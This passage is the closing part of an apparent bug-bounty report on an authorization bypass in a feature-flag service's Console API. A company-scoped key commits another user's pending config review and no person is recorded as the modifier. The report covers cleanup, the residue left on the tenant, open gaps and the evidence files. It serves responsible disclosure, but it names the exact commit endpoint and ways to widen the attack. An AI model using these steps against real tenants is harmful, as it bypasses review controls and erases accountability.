   resolved `modifierEmail` (or, if no user can be resolved, be refused per (1)). `modifierEmail: null`
   on a `config_review_commit` row should be treated as a bug signal in its own right — it is the
   fingerprint of this class of defect.
5. **Regression test:** with review required and a `pending` review authored by user B, assert that
   (a) a `owner: null` key on `commit` returns `400 on_behalf_of_required`, (b) B's own key returns
   `403 missing_commit_permission`, (c) an approver's key returns `200`, and (d) the gate's
   `lastModifierEmail` is never `null` on any of the four outcomes.

---

## 10. Cleanup and residue — stated, not hidden

Tenant restored and verified by read-back at the end of the independent run:

| object | action | final read-back |
| --- | --- | --- |
| probe gate `rb_probe_gate` | `DELETE` (class key) | `GET /console/v1/gates/rb_probe_gate` → **`404 "Gate not found."`** |
| probe dynamic config `rb_probe_dc` | `DELETE` (class key) | `GET /console/v1/dynamic_configs/rb_probe_dc` → **`404 "Dynamic Config not found."`** |
| pre-existing gate `escv_probe_gate` | untouched by this run | `isEnabled: true`, `version 17`, `reviewSettings {requiredReview:false, allowedReviewers:[]}` |
| pre-existing config `escal_probe_tmp_dc` | untouched by this run | `isEnabled: true`, `version 4` |
| roles | never changed this run | `GET /console/v1/users` → **Owner / member / member** (3 users) |
| 4 probe keys (`K_class`, `K_oclass`, `K_op`, `K_mp`) | `DeleteSDKKey` (version sweep, succeeded at v2) | key box → **`[]`**, `keybox_final_n: 0`; a revoked key returns `401 Unauthorized` |
| segments / experiments / unit_id_types / roles | not created | `[]` |
| tags | not created | **4** = baseline |
| `settings/reviews` | never changed | all `false` |
| `settings/teams` | never changed | `require_teams_on_configs: false` |

**Residue that cannot be cleaned — stated plainly.**

1. **Committed review records are immutable history.** The reviews committed on `rb_probe_gate` went
   with the gate when it was deleted, but **six `committed` review records remain on
   `escv_probe_gate`** from the discovery run (`4x2DGxLz…`, `36O61ufR…`, `31dNPHQu…`, `2F1PLAVa…`,
   `Df7v6NEw…`, `6Ry6IJUa…`). `DELETE` on a committed review returns `400 on_behalf_of_required`, and
   the API exposes no purge primitive. They are functionally inert (each is a `toggle_enabled` whose
   net effect is the restored state) but they are visible in that gate's review list. Baseline review
   list was empty, so the tenant is **not** byte-identical to baseline here.
2. **Counters moved and cannot be restored.** The probe gate's `version` advanced `3 → 4 → 5 → 6` and
   the dynamic config's `1 → 2 → 3` before deletion; on the pre-existing objects, `escv_probe_gate` is
   at `version 17` and `escal_probe_tmp_dc` at `version 4` as a cumulative result of this and earlier
   runs. `version` is a monotonic counter with no decrement API.
3. **`lastModifierEmail` / `lastModifierName` on the surviving objects** may reflect a credential
   rather than a person from an earlier run (`"CONSOLE API - console-…"`). State is baseline; metadata
   attribution is not.

**Budget.** The independent re-verification used **105 paced calls** at a **≥1.6 s enforced gap**
(`escal/rb_state.json` carried the count and the pacing across processes) under a 200-call cap, every
call retried 3× on TLS drop, `curl_cffi impersonate='chrome124'`. Secrets masked `first10…last4` in
every file and on stdout. The discovery run that first found this used 238 calls across 11 phases.

---

## 11. Open proof gaps — carried honestly

> **UPDATE 2026-10-17 (retest): the autotunes gap below is now CLOSED — the bypass is proven end to
> end on a fifth family.** A Member's personal key created autotune `r1_t4_at_b` with a pending
> review `2r70Ik5tDJw2qIXuVDN0nF` (review-create with a class key correctly returned
> `400 on_behalf_of_required` — the misplaced-guard signature holds on this family too), and the
> company-scoped class key then executed
> `PUT /console/v1/autotunes/r1_t4_at_b/reviews/2r70Ik5tDJw2qIXuVDN0nF/commit` → **200 "Autotune
> review committed successfully"**, `isStarted: true`, audit actor
> `"CONSOLE API - console-h46kKOB***"` with `modifierEmail: null` (attribution loss, as on the other
> families). Probe objects cleaned up. **Coverage is now 5/5 commit routes demonstrated or
> route-resolved: gates + dynamic_configs (end-to-end, this report), segments (sibling-pair
> signature, September), experiments (route-resolves to object lookup), autotunes (END-TO-END,
> 2026-10-17).** The remaining text below is retained as the original honest record.

1. **`experiments` and `autotunes` have no objects on this tenant.** `POST /console/v1/experiments`
   returned `400 "Bad Request Exception"` on two body shapes, and both collections are empty
   (`FINAL_experiments: []`, `FINAL_autotunes: []`). The commit route exists on those families — a
   fabricated id reached object lookup and returned `404 "Experiment not found"` /
   `404 "Autotune experiment not found"` rather than a route-resolution error — but no review could be
   created on them, so the bypass is **proven on `gates` and `dynamic_configs` only**. The vendor's
   documentation lists the `commit` verb for all three.
2. **`segments` has no create-review route.** `PUT /console/v1/segments/{id}/reviews/{rid}/commit`
   returns `404 "Segment not found"` (the route resolves and looks up its object), but there is no way
   to put a segment review into `pending` on this tenant, so the family could not be tested end to end.
3. **`x-on-behalf-of` was tested on `create` only.** Three value shapes were refused with
   `400 on_behalf_of_required` in the discovery run; no other verb and no other encoding was
   enumerated. A working value would be a second, distinct finding (identity spoofing) and deserves its
   own run. In this run `commit` was called with **no** `x-on-behalf-of` header at all.
4. **`allow_self_approval` was already `true` on the target gate.** The discovery run's API response
   confirmed it (`409 "Self-approval is already allowed for this gate."`). So on this gate a Member's
   own key could in principle have used the documented self-approval shortcut; the observed `403` on
   `commit` came from the `skip_config_review` check instead. A gate with `allow_self_approval: false`
   would isolate the self-approval path.
5. **The bypass was not re-demonstrated with the review policy ON.** The project policy was
   `is_config_review_required: false` throughout, and the probe gate carried
   `requiredReview: false`. The §8 control shows the policy state is not the variable — the identical
   call with the personal key is refused in the same state — but a run with the policy on and a
   `requiredReview: true` gate would close this gap directly. The discovery run's first attempt
   collided with an in-flight review (`409 "A review is already in progress for this gate."`).
6. **`POST /users/teams` returns a bare `400 "Bad Request Exception"` on every arm** and
   `GET /users/teams` is `403` for every arm including both company-scoped keys, so the team surface
   could not be resolved on this tenant. A tenant with teams enabled would settle whether the same
   guard is missing there.
7. **Only two credential classes were used for the differential** (`owner: null` company-scoped, and
   a personal key owned by the Member). `owner: null` with `["omni_read_only"]` was not tried against
   `commit`; if a read-only class key also commits, that would widen the finding.

---

## 12. Evidence index

All paths relative to `C:\Users\Mohamed Gaber\AppData\Local\Temp\amplitude\`.

| file | content |
| --- | --- |
| `escal/rb/v1_recon.json` | key minting for all four credentials (ids, owners, scopes, masked values); key-box reads for **both** sessions showing the Member sees the class keys in plaintext; role truth; tenant baselines; the probe gate's creation and baseline read (`isEnabled: true`, `version 3`); audit row count |
| `escal/rb/v2_contrast.json` | **THE CONTRAST** — R1 created `201 pending`; the four sibling refusals (`400 on_behalf_of_required`); the two personal-key refusals (`403 self_approval_blocked`, `403 missing_commit_permission`); the read-back showing nothing moved; **the class-key commit `200`**; the post-bypass read-back (`isEnabled false`, `version 4`, `lastModifierEmail null`); review R1 `committed` / `reviewers []`; **the audit trail** |
| `escal/rb/v3_gaps.json` | **closed gaps** — fabricated review id `404` (class key *and* personal key), fabricated gate id `404`, fabricated review `GET` `404`; Owner-authored R3 committed by the class key `200` (**author-independence proven**); the owner-class-key commit control; the **dynamic_configs** bypass end to end; the `experiments` / `autotunes` / `segments` route probes |
| `escal/rb/v3b_legit_and_family3.json` | **the legitimate path** — create (Member) → approve (Owner) → commit (Owner), with the fully attributed audit trail (`config_review_create` / `config_review_accept` / `config_review_commit`, every row carrying a `modifierEmail`) and the read-back showing `lastModifierEmail: mohamed-9499-2@agentmail.to` |
| `escal/rb/v4_cleanup.json` | probe gate + dynamic config deleted; `DELETE` on a committed review refused (`400`); all four keys revoked; key box back to `[]`; post-revocation `401` on every route |
| `escal/rb/v4b_final_state.json` | **final baseline read-back** — users Owner/member/member; gates 1; dynamic_configs 1; segments/experiments/unit_id_types/roles `[]`; tags 4; `settings/reviews` all false; probe gate and config confirmed gone (`404`); key box `[]`; revoked key `401` |
| `escal/rb_calls.json` | **every call, raw** — 105 rows: phase, arm, step label, method, path, request shape, status, message, redacted body, and the first 900 chars of the raw response |
| `escal/rb_h.py`, `escal/rb_v1.py` … `rb_v4b.py` | the harness and the six phases (pacing, 200-call cap, retry, masking, raw transcript) |
| `escal/restsw/p4_commit_bypass.json`, `p5_bypass_clean.json` | discovery-run evidence for the same finding (gate `escv_probe_gate`, `x-on-behalf-of` shapes, the `allow_self_approval` `409`) |
| `escal/REPORT-CONSOLE-REST-SWEEP.md` | the original discovery report, including the three gaps the independent run has now closed |
| `escal/SUBMISSION-STATSIG-MEMBER-TO-ADMIN.md` | the filed report this one is distinguished from — **the `commit` verb appears nowhere in it** |

---

## 13. Filing checklist for the triager

* **Different route, different object, different broken check** from the filed Member→Admin report.
  The two share a root pattern (`authorize on the key, not the caller`) and are otherwise disjoint.
* **Independently re-verified** in a separate run with its own credentials and its own probe objects;
  the discovery run's three open gaps are now closed, including the fabricated-id control that proves
  the `200` is a real commit and the author-independence test that proves the class key commits another
  user's review.
* **Reproducible verbatim** — every request above is raw HTTP, in order, with no hidden state.
* **Tenant restored**, with the unavoidable residue (immutable committed review records, monotonic
  `version` counters) documented rather than hidden.
* **CVSS computed** (6.5) with the calculator validated against the filed report's published 8.8.
